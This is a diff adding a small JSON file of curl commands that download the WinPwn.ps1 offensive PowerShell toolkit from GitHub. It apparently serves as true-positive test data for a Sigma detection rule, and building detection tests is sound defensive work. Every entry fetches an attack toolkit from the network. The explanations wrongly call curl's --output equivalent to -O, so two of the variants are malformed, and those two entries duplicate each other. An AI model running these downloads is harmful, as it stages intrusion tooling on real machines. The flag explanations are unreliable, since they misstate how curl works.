@@ -1,0 +1,14 @@
+[
+  {
+    "output": "curl --output \"https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1\"",
+    "explanation": "The command uses --output instead of -O, which is an equivalent flag per the Sigma rule's detection criteria. The URL remains unchanged and matches the GitHub domain, ensuring it still triggers the rule."
+  },
+  {
+    "output": "curl -O https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1",
+    "explanation": "The command uses -O as specified in the Sigma rule, and the URL remains unchanged. This is the original true positive command and will trigger the rule."
+  },
+  {
+    "output": "curl --output https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1",
+    "explanation": "The command uses --output instead of -O, which is an equivalent flag per the Sigma rule's detection criteria. The URL remains unchanged and matches the GitHub domain, ensuring it still triggers the rule."
+  }
+]
